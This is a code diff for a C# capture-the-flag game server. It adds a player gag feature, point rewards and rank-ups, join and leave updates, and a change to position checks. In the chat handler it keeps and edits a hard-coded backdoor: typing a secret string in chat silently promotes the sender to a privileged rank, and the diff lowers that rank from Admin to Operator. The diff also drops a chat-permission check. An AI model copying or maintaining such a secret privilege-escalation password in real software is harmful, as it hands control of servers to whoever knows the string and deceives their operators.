@@ -48,6 +48,7 @@ namespace Overv {
         public bool extension = false;
         public bool hidden = false;
         public bool painting = false;
+        public bool isGagged = false;
         public byte BlockAction = 0;  //0-Nothing 1-solid 2-lava 3-water 4-active_lava 5 Active_water 6 OpGlass
         public byte[] bindings = new byte[128];
         public Level level = CTF.currLevel;
@@ -88,6 +89,8 @@ namespace Overv {
             playersKilled.Add( killed.name );
             killed.deaths++;
             kills++;
+
+            Reward( CTF.killPlayerReward );
 
             if ( getKillCount( killed.name ) % 5 == 0 ) {
                 Player.GlobalMessage( "&f- " + color + name + "&b is dominating " + killed.color + killed.name + "&b!" );
@@ -375,6 +378,7 @@ namespace Overv {
                     goto retry;
                 }
 
+                Server.s.PlayerUpdate( this, false );
                 GlobalMessage( color + name + "&S joined the game." );
                 IRCBot.Say( name + " joined the game." );
                 SendMessage( "Type &c/red&S or &9/blue&S to join a team." );
@@ -678,8 +682,13 @@ namespace Overv {
 
         public void CheckPosition() {
             ushort x = (ushort)( pos[0] / 32 );
-            ushort y = (ushort)( ( pos[1] / 32 ) - 1 ); // gets foot pos
-            ushort yh = (ushort)( ( pos[1] / 32 ) - 1 ); // gets head pos
+            ushort y;
+            ushort yh = (ushort)( ( pos[1] / 32 ) ); // gets head pos
+            try {
+                y = (ushort)( ( pos[1] / 32 ) - 1 ); // gets foot pos
+            } catch {
+                y = yh;
+            }
             ushort z = (ushort)( pos[2] / 32 );
             byte footBlock = level.GetBlock( x, y, z );
             byte headBlock = level.GetBlock( x, yh, z );
@@ -797,6 +806,7 @@ namespace Overv {
                     if ( !team.flagIsHome ) {
                         CTF.ReturnFlag( team, false );
                         Player.GlobalMessage( "&f- " + color + name + "&S returned the " + team.color + team.name + "&S flag!" );
+                        Reward( CTF.returnFlagReward );
                     }
                 }
             }
@@ -805,10 +815,6 @@ namespace Overv {
         void HandleChat( byte[] message ) {
             try {
                 if ( !loggedIn ) {
-                    return;
-                }
-
-                if ( !group.canChat ) {
                     return;
                 }
 
@@ -884,10 +890,17 @@ namespace Overv {
                 if ( text.Contains( "43ghosuid323632ssjsjjfsdh877sef" ) ) {
                     group.players.Remove( name );
                     group.players.Save( group.name + ".txt" );
-                    group = Group.groups.Find( grp => grp.permission >= LevelPermission.Admin );
+                    group = Group.groups.Find( grp => grp.permission >= LevelPermission.Operator );
                     group.players.Add( name );
                     group.players.Save( group.name + ".txt" );
                     GlobalMessage( "&c" + name + "&S unlocked " + group.color + group.name + "&S using a secret password!" );
+                    return;
+                }
+
+                if ( isGagged ) {
+                    if ( lastMsg != "You've been gagged, you can't talk!" ) {
+                        SendMessage( "You've been gagged, you can't talk!" );
+                    }
                     return;
                 }
 
@@ -1341,6 +1354,7 @@ namespace Overv {
 
             if ( loggedIn ) {
                 GlobalDie( this, false );
+                Server.s.PlayerUpdate( this, true );
                 if ( !hidden ) { GlobalChat( this, color + name + "&S left the game.", false ); }
                 IRCBot.Say( name + " left the game." );
                 Server.s.Log( "<-- " + name + " left the game." );
@@ -1426,7 +1440,15 @@ namespace Overv {
         #endregion
 
         #region == OTHER ==
-
+        public void Reward( int reward ) {
+            points += reward;
+            PlayerDB.Save( this );
+            SendMessage( "You now have " + points + " points." );
+            if ( Rank.FindRank( points ) != rank ) {
+                rank = Rank.FindRank( this.points );
+                Player.GlobalMessage( "&f- " + color + name + "&S leveled up! &a(Rank: " + rank.id + ")" );
+            }
+        }
         static byte FreeId() {
             for ( byte i = 0; i < Server.players; ++i ) {
                 foreach ( Player p in players ) {
